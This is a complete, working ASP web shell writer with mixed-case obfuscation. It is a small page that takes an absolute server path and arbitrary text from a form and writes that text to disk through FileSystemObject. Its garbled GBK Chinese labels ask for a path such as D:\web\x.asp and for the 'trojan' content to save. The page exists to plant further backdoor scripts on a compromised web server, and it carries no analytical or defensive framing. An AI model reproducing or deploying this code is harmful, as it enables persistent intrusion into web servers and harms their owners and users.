<% Dim ObjFSO %>
<% Dim FDAtA %>
<% Dim ObjCOuntFilE %>
<% On ErrOr rEsumE nExt %>
<% SEt ObjFSO = SErvEr.CrEAtEObjEct("Scripting.FilESystEmObjEct") %>
<% iF Trim(rEquEst("syFDpAth"))<>"" thEn %>
<% FDAtA = rEquEst("cyFDDAtA") %>
<% SEt ObjCOuntFilE=ObjFSO.CrEAtETExtFilE(rEquEst("syFDpAth"),TruE) %>
<% ObjCOuntFilE.WritE FDAtA %>
<% iF Err =0 thEn %>
<% rEspOnsE.writE "<FOnt cOlOr=rED>sAvE SuccEss!</FOnt>" %>
<% ElsE %>
<% rEspOnsE.writE "<FOnt cOlOr=rED>SAvE UnSuccEss!</FOnt>" %>
<% EnD iF %>
<% Err.clEAr %>
<% EnD iF %>
<% ObjCOuntFilE.ClOsE %>
<% SEt ObjCOuntFilE=NOthing %>
<% SEt ObjFSO = NOthing %>
<% REspOnsE.writE "<FOrm ActiOn='' mEthOD=pOst>" %>
<% REspOnsE.writE "±£´æÎÄ¼þµÄ<FOnt cOlOr=rED>¾ø¶ÔÂ·¾¶(°üÀ¨ÎÄ¼þÃû:ÈçD:\wEb\x.Asp):</FOnt>" %>
<% REspOnsE.WritE "<input typE=tExt nAmE=syFDpAth wiDth=32 sizE=50>" %>
<% REspOnsE.WritE "<br>" %>
<% REspOnsE.writE "±¾ÎÄ¼þ¾ø¶ÔÂ·¾¶" %>
<% =sErvEr.mAppAth(REquEst.SErvErVAriAblEs("SCRIPT_NAME")) %>
<% REspOnsE.writE "<br>" %>
<% REspOnsE.writE "ÊäÈëÂíµÄÄÚÈÝ:" %>
<% REspOnsE.writE "<tExtArEA nAmE=cyFDDAtA cOls=80 rOws=10 wiDth=32></tExtArEA>" %>
<% REspOnsE.writE "<input typE=submit vAluE=±£´æ>" %>
<% REspOnsE.writE "</FOrm>" %>
